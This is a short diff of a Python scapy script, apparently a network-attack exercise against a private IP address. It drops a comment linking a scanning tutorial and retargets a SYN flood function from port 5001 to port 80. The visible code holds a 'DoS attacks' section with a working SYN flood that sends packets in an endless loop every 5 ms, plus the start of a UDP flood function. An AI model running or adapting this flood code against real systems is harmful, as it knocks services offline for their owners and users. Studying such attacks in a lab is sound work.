@@ -1,4 +1,3 @@
-#https://www.uv.mx/personal/angelperez/files/2018/10/scanning_texto.pdf
 from scapy.all import *
 
 ip = "192.168.210.162"
@@ -62,7 +61,7 @@ def urg_recon():
 
 # DoS attacks:
 def syn_flood_attack():
-	packet = IP(dst=ip) / TCP(dport=5001, flags="S")
+	packet = IP(dst=ip) / TCP(dport=80, flags="S")
 	send(packet, loop=1, inter=0.005)
 
 def udp_flood_attack():
